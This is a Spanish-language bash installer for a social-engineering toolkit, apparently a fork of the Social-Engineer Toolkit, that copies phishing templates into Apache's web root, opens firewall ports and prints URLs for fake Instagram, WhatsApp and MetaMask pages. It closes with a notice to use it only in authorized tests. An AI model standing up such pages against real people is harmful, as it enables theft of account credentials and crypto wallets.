#!/bin/bash

# Script de instalación automática para Kali Linux
# ingenieriasocial - Por MidasOrion

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║     🐉 Instalación Automática - ingenieriasocial              ║"
echo "║                   Para Kali Linux                              ║"
echo "║                   Por: MidasOrion                              ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

# Verificar si se ejecuta como root
if [ "$EUID" -ne 0 ]; then 
    echo "❌ Este script debe ejecutarse como root"
    echo "   Usa: sudo ./install_kali.sh"
    exit 1
fi

echo "✅ Ejecutando como root"
echo ""

# Actualizar sistema
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📦 Paso 1: Actualizando el sistema..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
apt update -qq

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📦 Paso 2: Instalando dependencias..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Instalar dependencias del sistema
apt install -y python3 python3-pip git apache2 php libapache2-mod-php > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "✅ Dependencias del sistema instaladas"
else
    echo "❌ Error instalando dependencias del sistema"
    exit 1
fi

# Instalar dependencias de Python
echo ""
echo "📦 Instalando dependencias de Python..."
pip3 install pexpect pycrypto pyopenssl pefile impacket flask flask-cors --quiet

if [ $? -eq 0 ]; then
    echo "✅ Dependencias de Python instaladas"
else
    echo "⚠️  Algunas dependencias de Python no se instalaron (continuando...)"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📂 Paso 3: Configurando permisos..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Dar permisos de ejecución
chmod +x setoolkit
chmod +x start_dashboard_simple.sh
chmod +x start_dashboard.sh
chmod +x subir_a_github.sh
chmod +x test_templates.sh

echo "✅ Permisos configurados"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🌐 Paso 4: Configurando Apache..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Copiar templates a Apache
cp -r src/templates/phishing/* /var/www/html/ 2>/dev/null

# Dar permisos a Apache
chown -R www-data:www-data /var/www/html/
chmod -R 755 /var/www/html/

# Habilitar y reiniciar Apache
systemctl enable apache2 > /dev/null 2>&1
systemctl restart apache2

if systemctl is-active --quiet apache2; then
    echo "✅ Apache configurado y corriendo"
else
    echo "⚠️  Apache no está corriendo (puedes iniciarlo manualmente)"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 Paso 5: Configurando Firewall..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Configurar UFW si está instalado
if command -v ufw &> /dev/null; then
    ufw allow 80/tcp > /dev/null 2>&1
    ufw allow 8000/tcp > /dev/null 2>&1
    ufw allow 8080/tcp > /dev/null 2>&1
    echo "✅ Firewall configurado"
else
    echo "⚠️  UFW no instalado (opcional)"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 Paso 6: Obteniendo información del sistema..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Obtener IP local
IP_LOCAL=$(ip addr show | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | head -1)

echo ""
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║              ✅ INSTALACIÓN COMPLETADA                         ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""
echo "📊 Información del Sistema:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  🌐 IP Local: $IP_LOCAL"
echo "  📂 Directorio: $(pwd)"
echo "  🐍 Python: $(python3 --version)"
echo "  🌐 Apache: $(apache2 -v | head -1)"
echo ""
echo "🎯 URLs de Acceso:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  📷 Instagram:  http://$IP_LOCAL/instagram/"
echo "  💬 WhatsApp:   http://$IP_LOCAL/whatsapp/"
echo "  🦊 MetaMask:   http://$IP_LOCAL/metamask/"
echo ""
echo "📊 Dashboard:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Para iniciar el dashboard ejecuta:"
echo "  ./start_dashboard_simple.sh"
echo ""
echo "  Luego accede a: http://$IP_LOCAL:8000/dashboard_simple.html"
echo ""
echo "🚀 Iniciar ingenieriasocial:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  sudo ./setoolkit"
echo ""
echo "📚 Documentación:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  cat INSTALL_KALI.md"
echo ""
echo "⚠️  IMPORTANTE:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  ✅ Solo usar en entornos autorizados"
echo "  ✅ Pruebas de penetración con permiso"
echo "  ❌ NO usar para actividades ilegales"
echo ""
echo "© 2025 ingenieriasocial - MidasOrion"
echo ""
